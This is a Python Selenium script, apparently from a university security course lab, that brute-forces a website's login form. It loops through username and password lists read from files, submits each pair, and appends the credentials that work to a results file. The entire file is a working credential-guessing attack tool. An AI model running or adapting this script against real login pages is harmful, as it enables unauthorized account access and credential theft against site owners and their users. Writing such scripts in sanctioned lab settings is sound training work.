import time
import pandas as pd
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import sys
def login(username,password):
    for name in username:
        for pwd in password:
            driver = webdriver.Chrome("/Users/nashzhao/Documents/MIT/COMP9447/bruteforce/chromedriver")
            driver.get("http://s3-9447-t2-site.s3-website-us-east-1.amazonaws.com/")
            print(driver.title)
            driver.find_element_by_id("logInButton").click()
            time.sleep(2)
            driver.find_element_by_id("email").send_keys(name)
            driver.find_element_by_id("pwd").send_keys(pwd)
            driver.find_element_by_id("login-modal-button").click()
            time.sleep(4)
            try:
                now_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                driver.find_element_by_id("logOutButton").click()
                print(f'success,username:{name},password:{pwd}')
                f = open('result.txt','a')
                f.write(f'{now_time},username:{name},password:{pwd}\n')
                f.close()
            except:
                print("error")
            driver.close()
            driver.quit()
def username_and_psaaword():
    username = []
    password = []
    with open('username.txt','r') as f:
        for line in f:
            username.extend(list(line.strip('\n').split(',')))
    with open('password.txt','r') as f:
        for line in f:
            password.extend(list(line.strip('\n').split(',')))
    return username,password

if '__name__' == '__name__':
    username,password = username_and_psaaword()
    login(username,password)
